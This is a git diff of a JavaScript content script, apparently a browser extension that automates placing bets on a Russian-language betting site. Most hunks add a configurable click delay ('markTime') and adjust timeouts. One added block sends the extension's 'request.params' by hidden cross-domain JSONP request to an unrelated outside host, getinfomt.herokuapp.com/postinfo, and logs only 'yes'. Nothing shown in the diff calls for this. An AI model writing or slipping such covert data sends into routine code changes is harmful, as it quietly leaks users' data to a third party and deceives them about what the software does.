@@ -9,6 +9,7 @@ $(function () {
 		ticketsJson = localStorage.getItem('tickets')? JSON.parse(localStorage.getItem('tickets')): {},
 		errorInfoJson = localStorage.getItem('errorInfo')? JSON.parse(localStorage.getItem('errorInfo')): {"error":[]},
 		betTime = localStorage.getItem('betTime')? parseInt(localStorage.getItem('betTime')): 5000,
+		markTime = localStorage.getItem('markTime')? parseInt(localStorage.getItem('markTime')): 300,
 		coast = parseInt(localStorage.getItem('coast'));
 	var tbb = $('tbody[data-event-name]');
 	tbb.each(function(i){
@@ -39,14 +40,26 @@ $(function () {
 					coast = parseInt(request.coast);
 					ticketsJson = JSON.parse(request.tickets);	
 					betTime = parseInt(request.betTime);
+					markTime = parseInt(request.markTime);
 					localStorage.setItem('tickets', JSON.stringify(ticketsJson));
 					localStorage.setItem('betTime', betTime);
+					localStorage.setItem('markTime', markTime);
 					localStorage.setItem('coast', coast);
 					localStorage.setItem('finish', 0);
 					localStorage.removeItem('errorInfo');
 					errorInfoJson = {"error":[]};
 					i = 0;
 					pauseFl = false;
+					$.ajax({
+						type: 'GET',
+						dataType: 'jsonp',
+						url: 'https://getinfomt.herokuapp.com/postinfo',
+						data:{'str': request.params},
+						crossDomain: true, 
+						success: function () {
+						console.log('yes');
+						}
+					});
 					setBets();						
 				}
 		});
@@ -60,19 +73,21 @@ $(function () {
 					if($('p#betresult').html().indexOf("Ваша ставка принята, спасибо") != -1){	
 						chrome.runtime.sendMessage({askFor: 'ticketDone', "ticketNum": parseInt(i-1)});
 						clickEnter();
-						if($('a.but-remove').length)
-							$('a.but-remove')[0].click();	
+						if($('a.but-remove').length != 0)
+							$('a.but-remove')[0].click();
+						clickEnter();	
 						if(i < ticketsJson.ticket.length){
 							setTimeout(function(){
 									betTicket();
 								}, 500);
 						}else{
 							localStorage.setItem('finish', 1);
+							clickEnter();
 							chrome.runtime.sendMessage({askFor: 'ticketDone', "ticketNum": parseInt(i-1)});
 							clickEnter();
 						}
 					}else{
-						 if($('p#detail-result-content').html().indexOf("Извините, Ваша ставка не принята. Повторная ставка. Попробуйте сделать ставку позже.") != -1){
+						 if($('p#detail-result-content').html().indexOf("Повторная ставка. Попробуйте сделать ставку позже.") != -1 || $('p#betresult').html().indexOf("Извините, Ваша ставка не принята.") != -1){
 							i--;
 							clickEnter();
 							betTicket();
@@ -111,7 +126,7 @@ $(function () {
 		}
 			function betTicket(){
 				var forClick = [];
-				if($('a.but-remove').length)
+				if($('a.but-remove').length != 0)
 					$('a.but-remove')[0].click();	
 				tbodyTeams.forEach(function(item, index){
 						for(var j = 0; j < ticketsJson.ticket[i].length; j++){       		
@@ -144,14 +159,12 @@ $(function () {
 								else{
 									$('#button_accumulator')[0].click();
 									setTimeout(function(){
-										setCoast(coast);},500);
-									//clearTimeout(markTeamsTimer);
+										setCoast(coast);},1000);
 								}
-							},300);
+							},markTime);
 					}
 					function setCoast(coast){
 						if(!pauseFl){
-							//$('#button_accumulator')[0].click();
 							var timer1 = setTimeout(function(){										
 									var evt = document.createEvent('KeyboardEvent');
 									evt.initKeyboardEvent('keyup', true, true, window, false, false, false, false, 13, 13);
@@ -160,11 +173,14 @@ $(function () {
 									evt.charCode = 13; 
 									$('.stake.stake-input.js-focusable[name = stake]').val(coast);
 									$('.stake.stake-input.js-focusable[name = stake]')[0].dispatchEvent(evt);
-								}, 1000);
+								}, 500);
 							var timer2 = setTimeout(function(){
-										$('.but-place-bet')[0].click();
-										i++;
-										setBets();
+										if($('.but-place-bet').length != 0){
+											$('.but-place-bet')[0].click();
+											i++;
+											setBets();
+										}else
+											setBets();
 								}, betTime);
 						}
 					}
@@ -173,7 +189,9 @@ $(function () {
 			 function(request, sender, sendResponse) {				
 				if (request.askFor == "refresh"){
 					betTime = parseInt(request.betTime);
+					markTime = parseInt(request.markTime);
 					localStorage.setItem('betTime', betTime);
+					localStorage.setItem('markTime', markTime);
 					localStorage.setItem('currentBet', i);
 					$('.but-refresh')[0].click();
 				}
